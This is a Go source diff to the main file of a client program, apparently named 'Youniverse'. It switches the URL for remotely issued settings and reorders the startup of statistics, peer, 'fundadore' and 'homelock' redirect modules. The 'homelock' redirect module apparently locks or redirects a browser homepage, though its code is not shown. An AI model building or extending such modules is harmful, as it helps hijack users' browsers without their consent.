@@ -9,7 +9,6 @@ import (
 	"net/http"
 	"net/rpc"
 	"os"
-	"strconv"
 	"strings"
 	"time"
 
@@ -26,7 +25,6 @@ import (
 )
 
 const (
-	YouniverseListenPort     uint16 = 13600
 	YouiverseSinnalNotifyKey string = "6491628D0A302AA2"
 )
 
@@ -143,8 +141,9 @@ func getStartSettings(account string, guid string) (config Config, err error) {
 	if false == strings.HasPrefix(guid, "00000000_") {
 		url = "http://social.ssoor.com/issued/settings/20160521/" + account + "/" + guid + ".settings"
 	} else {
-		url = "http://api.ieceo.cn/20161028/Init/Default/GUID/" + guid
-		//url = "http://api.lp8.com/Init/Default/GUID/" + guid
+		//url = "http://api.ieceo.cn/20161108/Init/Default/GUID/" + guid
+		url = "http://api.lp8.com/20161108/Init/Default/GUID/" + guid
+		//url = "http://younverse.ssoor.com/test"
 		//url = "http://younverse.ssoor.com/issued/settings/20160628/" + account + "/" + guid + ".settings"
 	}
 
@@ -200,13 +199,6 @@ func main() {
 	log.Info("[MAIN] Youniverse guid:", guid)
 	log.Info("[MAIN] Youniverse account name:", account)
 
-	port, err := common.SocketSelectPort("tcp", int(YouniverseListenPort))
-
-	if err != nil {
-		log.Error("Select youniverse listen port failed:", err)
-		return
-	}
-
 	config, err := getStartSettings(account, guid)
 
 	if err != nil {
@@ -219,24 +211,9 @@ func main() {
 		log.Info("[MAIN] Current starting to debug...")
 	}
 
-	log.Info("[MAIN] Start youniverse module:")
-	connInternalIP, err := common.GetConnectIP("tcp", "www.baidu.com:80")
-
-	if err != nil {
-		log.Error("Query connection ip failed:", err)
-		return
-	}
-
-	log.Info("[MAIN] Start youniverse module:")
-	peerAddr := connInternalIP + ":" + strconv.Itoa(int(port))
-	if err := youniverse.StartYouniverse(account, guid, peerAddr, config.Youniverse); err != nil {
-		log.Error("[MAIN] Youniverse start failed:", err)
-		return
-	}
-
-	log.Info("[MAIN] Start fundadore module:")
-	succ, err := fundadore.StartFundadores(account, guid, config.Fundadore)
-	log.Info("[MAIN] Fundadore start stats:", succ)
+	log.Info("[MAIN] Start statistics module:")
+	succ, err := statistics.StartStatistics(account, guid, config.Statistics)
+	log.Info("[MAIN] statistics start stats:", succ)
 	if false == succ {
 		log.Error("[MAIN] \t", err)
 		return
@@ -250,17 +227,23 @@ func main() {
 		return
 	}
 
-	log.Info("[MAIN] Start homelock module:")
-	succ, err = redirect.StartRedirect(account, guid, config.Redirect)
-	log.Info("[MAIN] Homelock start stats:", succ)
+	log.Info("[MAIN] Start youniverse module:")
+	if err := youniverse.StartYouniverse(account, guid, config.Youniverse); err != nil {
+		log.Error("[MAIN] Youniverse start failed:", err)
+		return
+	}
+
+	log.Info("[MAIN] Start fundadore module:")
+	succ, err = fundadore.StartFundadores(account, guid, config.Fundadore)
+	log.Info("[MAIN] Fundadore start stats:", succ)
 	if false == succ {
 		log.Error("[MAIN] \t", err)
 		return
 	}
 
-	log.Info("[MAIN] Start statistics module:")
-	succ, err = statistics.StartStatistics(account, guid, config.Statistics)
-	log.Info("[MAIN] statistics start stats:", succ)
+	log.Info("[MAIN] Start homelock module:")
+	succ, err = redirect.StartRedirect(account, guid, config.Redirect)
+	log.Info("[MAIN] Homelock start stats:", succ)
 	if false == succ {
 		log.Error("[MAIN] \t", err)
 		return
